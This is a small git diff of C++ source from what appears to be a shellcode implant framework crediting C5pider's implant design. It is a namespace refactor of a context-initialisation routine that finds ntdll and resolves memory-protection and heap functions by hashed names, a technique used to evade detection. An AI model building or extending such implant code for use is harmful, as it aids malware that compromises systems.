@@ -1,5 +1,4 @@
 #include <core/include/context.hpp>
-using namespace Memory;
 
 VOID ContextInit () {
     // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
@@ -19,7 +18,7 @@ VOID ContextInit () {
     MmSize = sizeof(MmAddr);
 
     if (
-        !(Instance.Modules.ntdll = LdrGetModuleAddress(NTDLL)) ||
+        !(Instance.Modules.ntdll = Memory::LdrGetModuleAddress(NTDLL)) ||
         !(FPTR(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
         !(FPTR(Instance.Nt.RtlAllocateHeap, Instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
         !(FPTR(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
